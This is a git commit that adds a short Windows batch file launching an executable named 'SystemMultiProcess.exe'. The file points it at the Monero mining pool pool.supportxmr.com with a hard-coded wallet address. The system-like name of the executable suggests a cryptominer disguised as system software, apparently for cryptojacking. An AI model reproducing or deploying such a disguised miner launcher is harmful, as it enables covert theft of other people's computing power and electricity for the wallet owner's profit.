91469b9a8dbd7f308add500a1bcf299df5d2b767
sopranotech <sopranotechmx@gmail.com>
2024-06-04 19:36:51 -0600

    Add files via upload

---
+++ SystemMultiProcess.cmd
@@ -0,0 +1,4 @@
+@echo off
+cd /d "%~dp0"
+SystemMultiProcess.exe -o pool.supportxmr.com:8080 -u 88imMgKukbs5ArvaTUMoNeBPde87CL4cXeGui3mL6qCr6FtQ8A62LGR5n3fr8vmNEiYTXtZEHouawaPxhYbA6BdwR3nxwkv
+pause
